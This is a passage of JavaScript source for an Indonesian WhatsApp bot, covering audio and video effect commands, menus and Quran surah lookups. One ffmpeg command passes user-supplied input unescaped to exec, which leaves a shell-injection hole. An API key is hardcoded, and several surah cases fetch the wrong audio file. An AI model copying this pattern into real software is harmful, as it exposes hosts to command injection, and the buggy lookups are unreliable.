					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted: adadeh})
						fs.unlinkSync(media)
				break
				case 'detikvideo':
				
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -loop 1 -i ${media} -c:v libx264 -t ${args[0]} -pix_fmt yuv420p ${ran}`, (err) => {
						benny.sendMessage(from, fs.readFileSync(ran), video, {mimetype: 'video/mp4', duration: cokmatane, quoted: adadeh})
						fs.unlinkSync(media)
					})
				break
				case 'cepetin':
				
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter_complex "rubberband=tempo=1.5" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'kencengin':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af "superequalizer=1b=10:2b=10:3b=1:4b=5:5b=7:6b=5:7b=2:8b=3:9b=4:10b=5:11b=6:12b=7:13b=8:14b=8:15b=9:16b=9:17b=10:18b=10[a];[a]loudnorm=I=-16:TP=-1.5:LRA=14" -ar 48k ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'bass':                 
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'tag':
				bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(5)
				teks = bodo.replace(bodom, '')
				orange = `${teks}@s.whatsapp.net`
				benny.sendMessage(from, `@${orange.split('@')[0]}`, text, {contextInfo: {mentionedJid: [orange]}})
				break
				case 'towame':
				bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(8)
				teks = bodo.replace(bodom, '')
				benny.sendMessage(from, `wa.me/${teks}`, text, {quoted: adadeh})
				break
				case 'menuhack':
				case 'menuheck':
				l = 1
				reply(require('./src/teks/help').menuhack(prefix, l))
				break
case 'menuhelper':
				l = 1
				reply(require('./src/teks/help').menuhelper(prefix, l))
				break
case 'menuaudio':
				l = 1
				reply(require('./src/teks/help').menuaudio(prefix, l))
				break
case 'menugroup':
case 'menugrup':
				l = 1
				reply(require('./src/teks/help').menugroup(prefix, l))
				break
case 'menuimage':
				l = 1
				reply(require('./src/teks/help').menuimage(prefix, l))
				break
case 'menudownload':
				l = 1
				reply(require('./src/teks/help').menudownload(prefix, l))
				break
case 'menugame':
				l = 1
				reply(require('./src/teks/help').menugame(prefix, l))
				break
case 'menunews':
				l = 1
				reply(require('./src/teks/help').menunews(prefix, l))
				break
case 'menusearch':
				l = 1
				reply(require('./src/teks/help').menusearch(prefix, l))
				break
case 'menuimagemaker':
				l = 1
				reply(require('./src/teks/help').menuimagem(prefix, l))
				break
case 'menuanime':
				l = 1
				reply(require('./src/teks/help').menuanime(prefix, l))
				break
case 'menusholawat':
				l = 1
				reply(require('./src/teks/help').menushol(prefix, l))
				break
case 'menuislami':
				l = 1
				reply(require('./src/teks/help').menuislami(prefix, l))
				break
case 'menuspammer':
				l = 1
				reply(require('./src/teks/help').menuspam(prefix, l))
				break
case 'menusticker':
				l = 1
				reply(require('./src/teks/help').menusticker(prefix, l))
				break
case 'menutextmaker':
				l = 1
				reply(require('./src/teks/help').menutextm(prefix, l))
				break
case 'menusticker':
				l = 1
				reply(require('./src/teks/help').menusticker(prefix, l))
				break
case 'menurandom':
				l = 1
				reply(require('./src/teks/help').menurandom(prefix, l))
				break
case 'menuconvert':
				l = 1
				reply(require('./src/teks/help').menuconvert(prefix, l))
				break
case 'menuowner':
				l = 1
				reply(require('./src/teks/help').menuowner(prefix, l))
				break
case 'menuother':
				l = 1
				reply(require('./src/teks/help').menuother(prefix, l))
				break
case 'menu':
case 'help':

spek = await benny.user.phone
	l = 1
	let u = []
				let giip = []
				for (mem of totalchat){
					u.push(mem.jid)
				}
				for (let id of u){
					if (id && id.includes('g.us')){
						giip.push(id)
					}
				}
				const timestamsp = speed();
	const latensis = speed() - timestamsp
	exec(`neofetch --stdout`, async (error, stdout, stderr) => {
	const childs = stdout.toString('utf-8')
	const teks = childs.replace(/Memory:/, "Ram:")
                var { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = benny.user.phone
                anu = process.uptime()
		if (simple == false) menunye = `${monospace}❏${monospace} ${monospace}${fake}${monospace}\n${monospace}❏${monospace} ${monospace}${tampilTanggal}${monospace}
${monospace}❏${monospace} ${monospace}Jam : ${tampilWaktu} WIB${monospace}
${monospace}❏${monospace} ${monospace}Jam : ${tampilWaktus} WITA${monospace}
${monospace}❏${monospace} ${monospace}Jam : ${tampilWaktuss} WIT${monospace}

${monospace}❏${monospace} ${monospace}Informasi User${monospace}
${monospace}❏${monospace} ${monospace}Nama: ${pushname}${monospace}
${monospace}❏${monospace} ${monospace}Tag: @${sender.split('@')[0]}${monospace}
${monospace}❏${monospace} ${monospace}Limit: ${isPremium ? 'Unlimited' : limit.getLimit(sender, _limit, limitCount)}${monospace}
${monospace}❏${monospace} ${monospace}Status: ${isOwner ? 'Owner' : 'User'}${monospace}
${monospace}❏${monospace} ${monospace}Premium: ${isPremium ? 'Premium' : 'Free'}${monospace}

${monospace}❏${monospace} ${monospace}Informasi BOT${monospace}
${monospace}❏${monospace} ${monospace}Name : ${benny.user.name}${monospace}
${monospace}❏${monospace} ${monospace}Browser : ${benny.browserDescription[1]}${monospace}
${monospace}❏${monospace} ${monospace}Server : ${benny.browserDescription[0]}${monospace}
${monospace}❏${monospace} ${monospace}Version : ${benny.browserDescription[2]}${monospace}
${monospace}❏${monospace} ${monospace}Speed : ${latensis.toFixed(4)}Detik${monospace}
${monospace}❏${monospace} ${monospace}Ver : Termux${monospace}
${monospace}❏${monospace} ${monospace}Platfrom : ${os.platform()}${monospace}
${monospace}❏${monospace} ${monospace}Core : ${os.cpus().length}${monospace}
${monospace}❏${monospace} ${monospace}RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB${monospace}
${monospace}❏${monospace} ${monospace}Prefix : 「 Multi Prefix 」${monospace}
${monospace}❏${monospace} ${monospace}Host : ${os.hostname}${monospace}
${monospace}❏${monospace} ${monospace}WA Version : ${spek.wa_version}${monospace}
${monospace}❏${monospace} ${monospace}Device : ${spek.device_manufacturer}${monospace}
${monospace}❏${monospace} ${monospace}Baterai : ${baterai.battery}${monospace}
${monospace}❏${monospace} ${monospace}Version : ${spek.os_version}${monospace}
${monospace}❏${monospace} ${monospace}Total hit : ${botHit.length}${monospace}
${monospace}❏${monospace} ${monospace}Total user : ${_registered.length}${monospace}
${monospace}❏${monospace} ${monospace}Group Chat : ${giip.length}${monospace}
${monospace}❏${monospace} ${monospace}Personal Chat : ${totalchat.length - giip.length}${monospace}
${monospace}❏${monospace} ${monospace}Total Chat : ${totalchat.length}${monospace}
${monospace}❏${monospace} ${monospace}User hit : ${hit.getHit(sender, _hit, hitCount)}${monospace}

 ${require('./src/teks/help').help(prefix, l, pushname)}`
 
if (simple == true) menunye = `${monospace}❏${monospace} ${monospace}${fake}${monospace}\n${monospace}❏${monospace} ${monospace}${tampilTanggal}${monospace}
${monospace}❏${monospace} ${monospace}Jam : ${tampilWaktu} WIB${monospace}
${monospace}❏${monospace} ${monospace}Jam : ${tampilWaktus} WITA${monospace}
${monospace}❏${monospace} ${monospace}Jam : ${tampilWaktuss} WIT${monospace}

${monospace}❏${monospace} ${monospace}Informasi User${monospace}
${monospace}❏${monospace} ${monospace}Nama: ${pushname}${monospace}
${monospace}❏${monospace} ${monospace}Tag: @${sender.split('@')[0]}${monospace}
${monospace}❏${monospace} ${monospace}Limit: ${isPremium ? 'Unlimited' : limit.getLimit(sender, _limit, limitCount)}${monospace}
${monospace}❏${monospace} ${monospace}Status: ${isOwner ? 'Owner' : 'User'}${monospace}
${monospace}❏${monospace} ${monospace}Premium: ${isPremium ? 'Premium' : 'Free'}${monospace}

${monospace}❏${monospace} ${monospace}Informasi BOT${monospace}
${monospace}❏${monospace} ${monospace}Name : ${benny.user.name}${monospace}
${monospace}❏${monospace} ${monospace}Browser : ${benny.browserDescription[1]}${monospace}
${monospace}❏${monospace} ${monospace}Server : ${benny.browserDescription[0]}${monospace}
${monospace}❏${monospace} ${monospace}Version : ${benny.browserDescription[2]}${monospace}
${monospace}❏${monospace} ${monospace}Speed : ${latensis.toFixed(4)}Detik${monospace}
${monospace}❏${monospace} ${monospace}Ver : Termux${monospace}
${monospace}❏${monospace} ${monospace}Platfrom : ${os.platform()}${monospace}
${monospace}❏${monospace} ${monospace}Core : ${os.cpus().length}${monospace}
${monospace}❏${monospace} ${monospace}RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB${monospace}
${monospace}❏${monospace} ${monospace}Prefix : 「 Multi Prefix 」${monospace}
${monospace}❏${monospace} ${monospace}Host : ${os.hostname}${monospace}
${monospace}❏${monospace} ${monospace}WA Version : ${spek.wa_version}${monospace}
${monospace}❏${monospace} ${monospace}Device : ${spek.device_manufacturer}${monospace}
${monospace}❏${monospace} ${monospace}Baterai : ${baterai.battery}${monospace}
${monospace}❏${monospace} ${monospace}Version : ${spek.os_version}${monospace}
${monospace}❏${monospace} ${monospace}Total hit : ${botHit.length}${monospace}
${monospace}❏${monospace} ${monospace}Total user : ${_registered.length}${monospace}
${monospace}❏${monospace} ${monospace}Group Chat : ${giip.length}${monospace}
${monospace}❏${monospace} ${monospace}Personal Chat : ${totalchat.length - giip.length}${monospace}
${monospace}❏${monospace} ${monospace}Total Chat : ${totalchat.length}${monospace}
${monospace}❏${monospace} ${monospace}User hit : ${hit.getHit(sender, _hit, hitCount)}${monospace}

 ${require('./src/teks/help').simple(prefix, l, pushname)}`
try {
					ppimg = await benny.getProfilePicture(sender)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
		benny.sendMessage(from, {text: menunye, jpegThumbnail: setthumb}, extendedText, {contextInfo: {mentionedJid: [sender, botNumber]}, quoted: adadeh})
	})
	  break
	  case 'al-fatihah':
	  
	  anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=1&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 1\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/1?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'cekserial':
                
                if (args.length < 1) return reply('Serialnya mana?')
                const serials = args[0]
				reply('Sedang mencari user...')
                if (register.checkRegisteredUserFromSerial(serials, _registered)) {
                    const names = register.getRegisteredNameFromSerial(serials, _registered)
                    const ages = register.getRegisteredAgeFromSerial(serials, _registered)
                    const timec = register.getRegisteredTimeFromSerial(serials, _registered)
                    const idi = register.getRegisteredIdFromSerial(serials, _registered)
					try {
					ppimg = await benny.getProfilePicture(idi)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				buffer = await getBaper(ppimg)
					teks = `*╔❏* *USER DITEMUKAN*\n*╠❏*\n*╠❏* *Nama:* ${names}\n*╠❏* *Umur:* ${ages}\n*╠❏* *Tag:* @${idi.split('@')[0]}\n*╠❏* *Nomor:* ${idi.replace('@s.whatsapp.net', '')}\n*╠❏* *ID:* wa.me/${idi.replace('@s.whatsapp.net', '')}\n*╠❏* *Waktu Daftar:* ${timec}\n*╚❏* *SN:* ${serials}\n`
                    benny.sendMessage(from, buffer, image, {contextInfo: {mentionedJid: [idi]}, quoted: adadeh, caption: teks})
                } else {
                    reply(`Akun dengan serial: *${serials}* tidak ditemukan!`)
                }
            break
	  case 'al-baqarah':
	  
	  anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=2&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 2\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/2?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-imran':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=3&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 3\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/3?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'an-nisa':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=4&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 4\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/4?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-maidah':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=5&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 5\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/5?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-anam':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=6&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 6\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/6?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-araf':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=7&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 7\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/7?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-anfal':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=8&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 8\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/8?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'at-taubah':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=9&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 9\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/9?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'yunus':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=10&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 10\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/10?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'hud':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=11&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 11\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/11?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'yusuf':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=12&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 12\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/12?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'ar-raad':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=13&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 13\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/13?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'ibrahim':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=14&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 14\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/14?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-hijr':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=15&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 15\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/15?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'an-nahl':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=16&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 16\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/16?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-isra':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=17&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 17\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-kahfi':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=18&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 18\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'maryam':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=19&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 19\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'taha':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=20&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 20\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-anbiya':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=21&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 21\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-qariah':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=101&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 101\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/101?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'buat':
anu = await getBaper('https://im6.ezgif.com/tmp/ezgif-6-c96129363347.mp4')
fs.writeFileSync('./example.mp4', anu)
break
case 'at-takasur':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=102&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 102\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/102?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-ashr':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=103&apikey=YunitaGanteng`)
				   quran = `Surah Al-Qur\`an Nomor: 103\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}
reply(mess.wait)
buffer = await getBaper(`http://api.lolhuman.xyz/api/quran/audio/103?apikey=${lolkey}`)
reply(quran.trim())
benny.sendMessage(from, buffer, audio, {quoted: adadeh, mimetype: 'audio/mp4', ptt: true})
break
case 'al-humazah':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=104&apikey=YunitaGanteng`)
